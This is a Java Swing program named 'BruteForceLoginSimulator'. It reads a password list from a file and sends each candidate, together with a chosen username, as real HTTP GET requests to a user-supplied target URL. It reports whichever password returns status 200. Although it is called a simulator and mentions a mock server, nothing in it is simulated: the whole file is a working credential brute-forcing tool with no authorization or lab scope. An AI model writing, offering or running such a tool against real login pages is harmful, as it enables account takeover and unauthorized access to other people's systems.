import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.net.URLEncoder;

public class BruteForceLoginSimulator extends JFrame implements ActionListener {
    private JTextField urlField, usernameField, passwordFileField;
    private JTextArea resultArea;
    private JButton startButton;

    public BruteForceLoginSimulator() {
        setTitle("Brute Force Login Simulator");
        setSize(700, 500);
        setLocationRelativeTo(null);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLayout(new GroupLayout(getContentPane()));
        GroupLayout layout = (GroupLayout) getContentPane().getLayout();
        layout.setAutoCreateGaps(true);
        layout.setAutoCreateContainerGaps(true);

        // URL Label and Field
        JLabel urlLabel = new JLabel("Target URL:");
        urlField = new JTextField(30);
        
        // Username Label and Field
        JLabel usernameLabel = new JLabel("Username:");
        usernameField = new JTextField(30);
        
        // Password File Label and Field
        JLabel passwordFileLabel = new JLabel("Password File:");
        passwordFileField = new JTextField(30);
        
        // Start Button
        startButton = new JButton("Start Brute Force");
        startButton.addActionListener(this);
        
        // Result Area
        resultArea = new JTextArea(15, 50);
        resultArea.setEditable(false);
        resultArea.setLineWrap(true);
        resultArea.setWrapStyleWord(true);
        JScrollPane resultScrollPane = new JScrollPane(resultArea);
        
        // Layout configuration
        layout.setHorizontalGroup(layout.createSequentialGroup()
            .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                .addComponent(urlLabel)
                .addComponent(usernameLabel)
                .addComponent(passwordFileLabel)
                .addComponent(startButton))
            .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                .addComponent(urlField)
                .addComponent(usernameField)
                .addComponent(passwordFileField)
                .addComponent(resultScrollPane))
        );
        
        layout.setVerticalGroup(layout.createSequentialGroup()
            .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                .addComponent(urlLabel)
                .addComponent(urlField))
            .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                .addComponent(usernameLabel)
                .addComponent(usernameField))
            .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                .addComponent(passwordFileLabel)
                .addComponent(passwordFileField))
            .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                .addComponent(startButton))
            .addComponent(resultScrollPane)
        );

        // Customize look and feel
        UIManager.put("Button.background", new Color(0, 123, 255));
        UIManager.put("Button.foreground", Color.RED);
        UIManager.put("Button.font", new Font("Segoe UI", Font.BOLD, 14));
        UIManager.put("TextField.font", new Font("Segoe UI", Font.PLAIN, 14));
        UIManager.put("TextArea.font", new Font("Segoe UI", Font.PLAIN, 14));
        UIManager.put("ScrollPane.border", BorderFactory.createEmptyBorder());

        SwingUtilities.updateComponentTreeUI(this);
        setVisible(true);
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        String url = urlField.getText();
        String username = usernameField.getText();
        String passwordFile = passwordFileField.getText();
        resultArea.setText("Starting brute force attack...\n");

        try (BufferedReader reader = new BufferedReader(new FileReader(passwordFile))) {
            String password;
            while ((password = reader.readLine()) != null) {
                resultArea.append("Trying password: " + password + "\n");

                // Simulate a login attempt
                if (attemptLogin(url, username, password)) {
                    resultArea.append("Login successful with password: " + password + "\n");
                    return;
                }
            }
            resultArea.append("Brute force attack finished. No valid password found.\n");
        } catch (IOException ex) {
            resultArea.append("Error reading password file: " + ex.getMessage() + "\n");
        }
    }

    private boolean attemptLogin(String url, String username, String password) {
        try {
            // Encode parameters
            String encodedUsername = URLEncoder.encode(username, StandardCharsets.UTF_8.toString());
            String encodedPassword = URLEncoder.encode(password, StandardCharsets.UTF_8.toString());

            // Construct URI
            URI uri = new URI(url + "?username=" + encodedUsername + "&password=" + encodedPassword);
            URL loginUrl = uri.toURL();

            HttpURLConnection conn = (HttpURLConnection) loginUrl.openConnection();
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();

            // Simulating a mock server success response code (e.g., 200 OK)
            return responseCode == 200;
        } catch (IOException | URISyntaxException ex) {
            resultArea.append("Connection error: " + ex.getMessage() + "\n");
        }
        return false;
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> new BruteForceLoginSimulator());
    }
}
